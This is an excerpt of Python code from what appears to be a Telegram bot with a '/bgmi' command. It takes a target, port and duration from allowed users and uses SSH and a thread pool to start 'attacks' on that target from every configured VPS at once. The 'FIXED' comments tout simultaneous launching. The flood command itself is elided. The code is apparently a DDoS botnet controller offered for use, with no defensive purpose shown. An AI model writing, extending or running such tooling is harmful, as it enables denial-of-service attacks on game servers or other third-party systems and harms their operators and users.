...
# ========== FIXED: SIMULTANEOUS ATTACK EXECUTION ==========
# Function to execute attack on a single VPS
def execute_attack_on_vps(vps, target, port, time):
    ...
    try:
        ...
        # Quick verification
        stdin, stdout, stderr = ssh.exec_command(f"ps -p {pid} > /dev/null 2>&1 && echo 'RUNNING' || echo 'NOT_RUNNING'")
        status = stdout.read().decode().strip()
        
        ssh.close()
        
        if status == "RUNNING":
            return f"✅ Attack started on {vps['host']} (PID: {pid})"
        else:
            return f"⚠️ Attack may have failed on {vps['host']}"
            
    except Exception as e:
        return f"❌ Failed on {vps['host']}: {str(e)}"

# FIXED: Function to execute attack on all VPS SIMULTANEOUSLY
def execute_attack_on_all_vps(target, port, time):
    vps_list = read_vps_list()
    results = []
    
    if not vps_list:
        return ["❌ No VPS configured. Use /addvps first."]
    
    # Use ThreadPoolExecutor to run attacks concurrently
    with concurrent.futures.ThreadPoolExecutor(max_workers=len(vps_list)) as executor:
        # Submit all attacks simultaneously
        future_to_vps = {
            executor.submit(execute_attack_on_vps, vps, target, port, time): vps 
            for vps in vps_list
        }
        ...
        for future in concurrent.futures.as_completed(future_to_vps):
            ...
            try:
                ...
                results.append(f"❌ Exception on {vps['host']}: {str(exc)}")
...
# FIXED: /bgmi command handler with simultaneous execution
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 241:
                ...
                # Execute attack on all VPS SIMULTANEOUSLY
                bot.reply_to(message, "⚡ Launching INSTANT attacks on all VPS...")
                vps_results = execute_attack_on_all_vps(target, port, time)
                
                response = f"🚀 INSTANT ATTACK LAUNCHED ON ALL VPS!\nTarget: {target}\nPort: {port}\nTime: {time} seconds\n\nVPS Status:\n" + "\n".join(vps_results) + "\n\n💥 All attacks started SIMULTANEOUSLY across all VPS!"
        else:
